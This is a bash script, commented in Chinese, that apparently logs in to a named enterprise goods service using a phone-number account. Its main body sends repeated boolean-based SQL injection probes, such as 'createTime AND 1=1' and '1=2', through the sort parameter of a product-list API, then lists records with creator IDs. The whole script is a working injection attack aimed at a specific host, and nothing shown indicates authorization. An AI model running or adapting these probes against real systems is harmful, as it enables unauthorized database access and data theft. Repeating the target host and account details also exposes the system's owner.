#!/bin/bash

TOKEN=$(curl -sk "http://longnows-gts.t.kkgroup.cn/pms/api/v1/pmsUser/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"account":"19129430218","password":"any"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

sign_request() {
  REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
  TIMESTAMP=$(date +%s000)
  NONCE=$(echo -n "${REQUEST_ID}${TIMESTAMP}" | md5)
  echo "$REQUEST_ID|$TIMESTAMP|$NONCE"
}

# ===== SQL注入测试 - ORDER BY 模式 =====
echo "====== SQL注入测试 - ORDER BY 模式 ======"

# 测试1: ORDER BY 注入 - 类似pubparam的注入模式
echo ""
echo "--- 测试1: sort参数 ORDER BY 注入 TRUE ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime","order":"desc"}' 2>&1 | python3 -c "
import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

echo ""
echo "--- 测试2: sort参数 ORDER BY 注入 FALSE ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime","order":"asc"}' 2>&1 | python3 -c "
import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试3: ORDER BY 注入 - 尝试find_in_set盲注
echo ""
echo "--- 测试3: sort参数 ORDER BY 盲注 TRUE ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime DESC","order":"desc"}' 2>&1 | python3 -c "
import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

echo ""
echo "--- 测试4: sort参数 ORDER BY 注入 - 带括号注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime AND 1=1","order":"desc"}' 2>&1 | python3 -c "
import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

echo ""
echo "--- 测试5: sort参数 ORDER BY 注入 FALSE (1=2) ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime AND 1=2","order":"desc"}' 2>&1 | python3 -c "
import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试6: 执行确认create后查看新创建的商品
echo ""
echo "--- 测试6: 查看新创建的商品 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{}' 2>&1 | python3 -c "
import sys,json; d=json.load(sys.stdin); 
items = d.get('data', [])
if isinstance(items, list):
    for item in items:
        print(f'  uid={item.get(\"uid\")} materialNo={item.get(\"materialNo\")} goodsName={item.get(\"goodsName\")} createUserId={item.get(\"createUserId\")}')
"